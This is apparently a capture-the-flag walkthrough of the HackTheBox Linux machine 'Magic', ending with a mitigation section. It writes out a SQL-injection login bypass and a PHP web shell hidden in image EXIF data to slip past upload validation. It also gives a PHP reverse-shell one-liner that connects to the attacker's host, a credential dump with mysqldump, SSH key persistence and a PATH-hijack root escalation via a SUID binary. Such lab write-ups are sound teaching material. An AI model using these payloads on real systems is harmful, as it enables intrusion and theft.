# Magic

![](images/info.PNG)

__Task__: Find [user.txt](#user-flag) and [root.txt](#root-flag)

### Penetration Methodologies

__Scanning__

- nmap

__Enumeration__

- Webpage enumeration

- Database dumping

__Exploitation__

- SQL injection

- Improper image validation

__Priv Esc__

- SUID Binaries

- Path variable abuse

***

This is my guide to the HackTheBox Linux machine _Magic_.

## User Flag

Our first step is to scan _Magic_ with `nmap`.

- __sC__: Enable common scripts

- __sV__: version and service on the port

- __O__: remote OS detection using fingerprinting

```
# Nmap 7.80 scan initiated Mon Jun  1 15:06:51 2020 as: nmap -sC -sV -O -oA scan185 10.10.10.185
Nmap scan report for 10.10.10.185
Host is up (0.097s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=6/1%OT=22%CT=1%CU=37392%PV=Y%DS=2%DC=I%G=Y%TM=5ED5600E
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  1 15:07:42 2020 -- 1 IP address (1 host up) scanned in 51.19 seconds
```

Once the results return, we'll also run a full port scan, which yields nothing of use. Two standard ports are open, 22 and 80, which indicates a webserver.  

Let's head over to the webpage.

![](images/webpage.png)

The page looks like a simple image repository with a few dead links, and a log in. Let's check out the log in page.

![](images/login.png)

After trying a few default usernames and passwords, they don't seem to work. Let's attempt a SQL injection to see if this site is vulnerable. There a few tools that can help automate this process but we'll quickly test a few options manually. [This article](https://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html) has some great information on bypassing logins with SQL injection vulnerabilities.

After a few tries, the following gets us logged in.

```
username: ' or 1=1 --
password: ' or 1=1 --
```

It looks like we now have access to an image upload page.

![](images/upload.png)

Uploading an image reveals that it can be accessed remotely via the URL path `http://10.10.10.185/images/uploads/image.jpg`. This indicates to us that if we can upload code, we can potentially open a reverse shell to the box.

Although unlikely, let's try uploading a reverse shell script with the JPEG extension appended to the end.

![](images/error.png)

No luck. There is some level of image validation occurring here, so let's try a different route. Chances are, the validator is looking at the MIME type and the extension.

Using the `exiftool`, let's add some simple PHP code to the comment metadata of an image that will allow RCE on the box, if it bypasses the validator.

Additionally, in order for our browser to execute the code injected in the image, we need to add the PHP extension to the image name, but we must still keep the JPEG extension at the end, as this will allow the image through.

```
$ sudo exiftool -Comment='<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>' sponge.jpg
$ mv sponge.jpg sponge.php.jpg
```

Let's try to get this uploaded.

![](images/success.png)

Success! Using the following URL, we should be able to execute commands remotely.

```
http://10.10.10.185/images/uploads/photo.php.png?cmd=COMMAND
```

It looks like we are able to do so.

![](images/cmds.png)

This is a bit clunky and the images are wiped after a certain period of time. Let's see if we can use this command execution to get a reverse shell.

Firstly, we'll start our `netcat` listener.

```
$ nc -lvnp 4444
```

If all goes well, the following PHP command plugged into the URL will open a reverse shell on the box and connect back to our machine.

```
php -r '$sock=fsockopen("10.10.15.2",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Plugging it in as is, though, could cause some unwanted issues as the browser tries to interpret certain characters and breakpoints. Let's use an online URL encoder to help mitigate this. This simply replaces the characters with something more concise for the browser to interpret.

![](images/encode.png)

With our listener ready and our image payload uploaded, navigating to this link should open a reverse shell that connects to our attacking machine.

```
http://10.10.10.185/images/uploads/sponge.php.jpg?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.15.2%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

We successfully connect. Let's run a python command to upgrade our shell.

```
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
```
We'll have a look around. First things first, we are the `www-data` user and don't currently have access to `user.txt` flag. But there appears to be a user, `theseus`, that may have access. Let's try to escalate our privileges.

Within the Magic subdirectory of the webserver, we find a database file. Looking at the contents, we can see a password `iamkingtheseus`.

![](images/db-file.png)

Using this password to change users to `theseus` doesn't work, but we may be able to access the database to reveal further credentials. The command `mysqldump` is present on the box; we can use it to dump the login table in the _Magic_ database.

```
$ mysqldump -u theseus -piamkingtheseus Magic login
```

The command executes correctly, and we can see values containing a username and password.

![](images/db-dump.png)

Let's re-attempt log in, this time with our new password.

```
$ su theseus
Password: Th3s3usW4sK1ng
```

We log in as user `theseus`. Let's grab the user flag. On to root!

![](images/user-flag.png)

## Root Flag

First thing we'll do is add our public key, granting us a bit more reliable persistence to the machine. I usually reference [Linux Handbook](https://linuxhandbook.com/add-ssh-public-key-to-server/) for details on how to do this.

```
$ cd /home/theseus/.ssh
$ printf "[public key]" >> authorized_keys
```

Now we can connect via SSH. First, though, let's upload the [Linux Smart enumeration](https://github.com/diego-treitos/linux-smart-enumeration) with secure copy.

```
$ scp lse.sh theseus@10.10.10.185:/tmp
```

Now, we'll connect and run our enumeration script. One thing quickly stands out: it looks like an unusual SUID bit is set for the `sysinfo` command.

![](images/suid.png)

Viewing the file information for `/bin/sysinfo` shows the owner is root and, because the SUID bit is set, this file with execute as the owner. Hacking Articles has a [great write-up](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/) detailing exactly how we can abuse SUID to escalate our privileges.

```
$ ls -al /bin/sysinfo
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
```

Let's go ahead and  upload pspy64, [an unprivileged process spy](https://github.com/DominicBreuker/pspy), and use it view exactly what is called and executed when we run `sysinfo`.

```
$ scp pspy64 theseus@10.10.10.185:/tmp
```

Running `sysinfo`, we can see it calls a couple commands, one of which is `lshw`.

![](images/processes.png)

Because it does not specify the full path of the command, instead relying on the system `$PATH` variable, we can manipulate the path to execute whatever command we want. Hacking Articles has another [article on this topic](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/).

First, we'll create a file `lshw` in the `/tmp` directory. Then we will add the `/tmp` directory to the system path. When `sysinfo` is ran, it'll execute our script first, opening a bash shell as root.

```
$ cd /tmp
$ echo "/bin/bash" > lshw
$ chmod 777 lshw
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin/:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
$ export PATH=/tmp:$PATH
$ sysinfo
```

Running `sysinfo`, our root shell successfully spawns.

![](images/privesc.png)

I had problems seeing the results of my commands in this shell so let's add our public SSH key to root's `authorized_keys` file.

```
$ cd /root/.ssh
$ mkdir .ssh
$ printf "[public key]" >> authorized_keys
```

Finally, we'll connect via SSH and capture the final flag!

![](images/root-flag.png)

***

### Mitigation

- Input validation to avoid SQL injection is very important. Bypassing a log in is pretty mild in comparison to dumping a database, but both are dangerous. Positive Technologies has some [great information](https://www.ptsecurity.com/ww-en/analytics/knowledge-base/how-to-prevent-sql-injection-attacks/#2) to help mitigate the risk of this occurring.

- In line with input validation, image validation is also of top priority. As this box demonstrates, weak validation can lead to remote code execution. At the least, there was some level of validation occurring, but only checking the last extension on a file is easily bypassed. OWASP has an awesome [cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) detailing mitigation techniques for file upload vulnerabilities.

- Avoid password reuse. Shared passwords between services is one of the easiest ways to escalate or move laterally.

- Setting the SUID bit can be useful to allow users to run certain programs with a higher level of privilege and it does adhere to the security principle of Least Privilege, however, a system administrator must carefully consider the risks of enabling SUIDs. In this particular scenario, ensuring that the `sysinfo` program used full paths for the commands it executed would've prevented the path injection attack.

### Final Thoughts

This was a great box, one of my favorites, I enjoyed it at every step. It was certainly challenging and I learned a ton about basic web application vulnerabilities. If you made it this far, feel free to check out [my script](https://github.com/chdav/hackthebox-writeups/tree/master/machines/Linux/Magic/magicjack-master)! I made it to automate the initial foothold, it can be found on my [Github](https://github.com/chdav/hackthebox-writeups).
